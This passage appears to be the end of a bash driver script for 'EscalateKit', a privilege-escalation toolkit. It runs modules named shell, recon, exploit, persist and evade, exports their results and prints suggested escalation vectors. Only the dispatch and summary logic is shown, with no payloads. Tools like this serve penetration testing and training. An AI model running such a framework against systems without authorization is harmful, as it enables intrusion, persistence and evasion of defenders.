if [ "$MODULES_TO_RUN" = "all" ]; then
    modules=("shell" "recon" "exploit" "persist" "evade")
else
    # Split the modules by comma
    IFS=',' read -ra modules <<<"$MODULES_TO_RUN"
fi

# Check if any modules are specified
if [ ${#modules[@]} -eq 0 ]; then
    log_message "ERROR" "No modules specified"
    display_help
    exit $E_MISSING_PARAM
fi

# Run modules based on selected parallel mode
case "$PARALLEL_MODE" in
"fork")
    run_with_fork "${modules[@]}"
    ;;
"thread")
    run_with_thread "${modules[@]}"
    ;;
"subshell")
    run_with_subshell "${modules[@]}"
    ;;
*)
    # Default to sequential execution if no parallel mode specified
    log_message "INFOS" "Running modules in sequential mode"
    for module in "${modules[@]}"; do
        run_module "$module"
    done
    ;;
esac

# Export results if format specified
if [ -n "$EXPORT_FORMAT" ]; then
    # Split the export format string by comma
    IFS=',' read -ra formats <<<"$EXPORT_FORMAT"
    for format in "${formats[@]}"; do
        export_results "$format"
    done
fi

# Display summary
if [ "$QUIET_MODE" = false ]; then
    echo ""
    echo "========================================"
    echo "EscalateKit Execution Summary"
    echo "========================================"
    echo "Modules run: ${modules[*]}"
    echo "Results saved to: $OUTPUT_DIR"
    echo ""

    # Check if we found any potential escalation vectors
    if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
        echo "Potential Privilege Escalation Vectors:"
        grep -A 1 "\[+\]" "$OUTPUT_DIR/exploit/suggestions.txt" | grep -v -- "--"
        echo ""
        echo "For detailed results, check the output directory or run with -o option to export results."
    fi
fi

log_message "INFOS" "EscalateKit execution completed successfully"
exit $E_SUCCESS
